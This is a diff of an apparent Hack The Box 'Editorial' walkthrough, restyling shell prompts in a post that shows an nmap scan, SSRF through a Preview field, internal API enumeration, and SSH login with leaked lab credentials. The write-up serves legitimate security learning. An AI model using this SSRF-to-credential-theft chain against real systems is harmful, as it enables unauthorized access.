@@ -28,8 +28,7 @@ last_modified_at: '2026-09-04T12:04:05+01:00'
 Started as usual with a full TCP scan 
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.55.144 -oN nmap/tcp_scan.nmap 
+tr3m0x@ubuntu:~/htb/linux/Editorial$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.55.144 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 17:23 CET
 Warning: 10.129.55.144 giving up on port because retransmission cap hit (6).
 Nmap scan report for 10.129.55.144
@@ -52,8 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 114.24 seconds
 Two ports are open, and port 80 is redirecting to editorial.htb, so we need to add it to our /etc/hosts file
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $echo "10.129.55.144 editorial.htb" | sudo tee -a /etc/hosts
+tr3m0x@ubuntu:~/htb/linux/Editorial$ echo "10.129.55.144 editorial.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Web Enumeration
@@ -79,8 +77,7 @@ I set up a local Python server and put the URL in that field, uploaded a random 
 but I got nothing. I kept looking around and saw the **Preview** button, so I filled the fields again and pressed **Preview**. This time I got a request to my local server.
 
 ```bash
-─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $serve
+tr3m0x@ubuntu:~/htb/linux/Editorial$ serve
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.55.144 - - [31/Aug/2026 17:42:48] "GET /?ssrf=true HTTP/1.1" 200 -
 ```
@@ -107,8 +104,7 @@ The only port that doesn't return a JPEG file is port 5000.
 it gave us back `static/uploads/b241018d-9ae1-4b80-aa04-302f009a4868.`
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $curl http://editorial.htb/static/uploads/32b0c6d4-5091-46e5-b22e-56c987c281fd
+tr3m0x@ubuntu:~/htb/linux/Editorial$ curl http://editorial.htb/static/uploads/32b0c6d4-5091-46e5-b22e-56c987c281fd
 {"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
 ```
 
@@ -118,8 +114,7 @@ I tested them all, and the most interesting one is the **/api/latest/metadata/me
 ![api_authors](/assets/img/posts/editorial/api_authors.png)
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $curl http://editorial.htb/static/uploads/6c973c83-b888-49f2-9041-e40b570a73bb
+tr3m0x@ubuntu:~/htb/linux/Editorial$ curl http://editorial.htb/static/uploads/6c973c83-b888-49f2-9041-e40b570a73bb
 {"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
 ```
 
@@ -130,8 +125,7 @@ I tested them all, and the most interesting one is the **/api/latest/metadata/me
 I SSH'd to the box with the found credentials, and it worked.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/Editorial]
-└──╼ $ssh dev@editorial.htb 
+tr3m0x@ubuntu:~/htb/linux/Editorial$ ssh dev@editorial.htb 
 The authenticity of host 'editorial.htb (10.129.55.144)' can't be established.
 ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
 This key is not known by any other names.
